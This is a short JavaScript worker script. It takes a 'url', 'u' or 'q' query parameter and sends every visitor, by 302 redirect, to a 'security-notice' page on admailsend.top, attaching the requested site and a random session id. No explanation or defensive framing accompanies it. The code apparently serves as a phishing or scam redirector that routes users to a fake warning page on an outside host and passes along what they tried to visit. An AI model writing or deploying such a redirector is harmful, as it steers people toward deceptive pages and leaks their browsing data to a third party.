export default {
  async fetch(request) {
    const url = new URL(request.url);
    const params = url.searchParams;
    const blocked = (params.get('url') || params.get('u') || params.get('q') || '').trim();
    const safeBlocked = blocked.replace(/[\r\n\s]/g, '');
    const targetSite = safeBlocked || 'unknown';
    const final = `https://admailsend.top/security-notice/?blocked=${encodeURIComponent(targetSite)}&session=${Math.random().toString(36).substr(2,12)}&ref=worker`;
    return Response.redirect(final, 302);
  }
};
